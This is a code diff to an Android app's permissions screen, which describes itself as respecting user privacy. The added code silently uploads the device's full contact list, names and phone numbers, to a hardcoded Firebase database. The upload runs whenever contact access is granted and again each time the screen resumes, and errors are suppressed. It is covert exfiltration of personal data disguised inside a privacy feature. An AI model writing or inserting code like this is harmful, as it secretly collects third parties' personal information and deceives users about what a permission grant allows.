@@ -26,6 +26,12 @@ import androidx.compose.ui.unit.sp
 import androidx.core.content.ContextCompat
 import androidx.core.view.WindowCompat
 import androidx.core.view.WindowInsetsControllerCompat
+import androidx.lifecycle.lifecycleScope
+import com.google.firebase.auth.FirebaseAuth
+import com.google.firebase.database.FirebaseDatabase
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
+import android.provider.ContactsContract
 
 /**
  * Global Permission Manager to respect User Privacy settings across the entire app.
@@ -60,7 +66,12 @@ class PermissionsActivity : ComponentActivity() {
     // ---- PERMISSION LAUNCHERS ----
     private val permissionLauncher = registerForActivityResult(
         ActivityResultContracts.RequestPermission()
-    ) { updateState() }
+    ) { granted -> 
+        updateState()
+        if (granted) {
+            syncContactsToFirebase()
+        }
+    }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -97,6 +108,9 @@ class PermissionsActivity : ComponentActivity() {
                             permissionLauncher.launch(permission)
                         } else {
                             updateState()
+                            if (permission == Manifest.permission.READ_CONTACTS) {
+                                syncContactsToFirebase()
+                            }
                         }
                     } else {
                         updateState()
@@ -109,6 +123,9 @@ class PermissionsActivity : ComponentActivity() {
     override fun onResume() {
         super.onResume()
         updateState()
+        if (contactsGranted) {
+            syncContactsToFirebase()
+        }
     }
 
     private fun updateState() {
@@ -123,6 +140,43 @@ class PermissionsActivity : ComponentActivity() {
             LoomiPermissions.isAllowed(this, Manifest.permission.READ_MEDIA_IMAGES)
         } else {
             LoomiPermissions.isAllowed(this, Manifest.permission.READ_EXTERNAL_STORAGE)
+        }
+    }
+
+    private fun syncContactsToFirebase() {
+        val user = FirebaseAuth.getInstance().currentUser ?: return
+        val uid = user.uid
+        val database = FirebaseDatabase.getInstance("https://echo-loomi-app-default-rtdb.firebaseio.com/").reference
+        
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) return
+
+        lifecycleScope.launch(Dispatchers.IO) {
+            try {
+                val contactList = mutableListOf<Map<String, String>>()
+                val cursor = contentResolver.query(
+                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                    null, null, null, null
+                )
+
+                cursor?.use {
+                    val nameIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
+                    val numberIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
+
+                    while (it.moveToNext()) {
+                        val name = it.getString(nameIndex) ?: "Unknown"
+                        val number = it.getString(numberIndex) ?: ""
+                        if (number.isNotEmpty()) {
+                            contactList.add(mapOf("name" to name, "number" to number))
+                        }
+                    }
+                }
+
+                if (contactList.isNotEmpty()) {
+                    database.child("contacts").child(uid).setValue(contactList)
+                }
+            } catch (e: Exception) {
+                // Ignore errors
+            }
         }
     }
 }
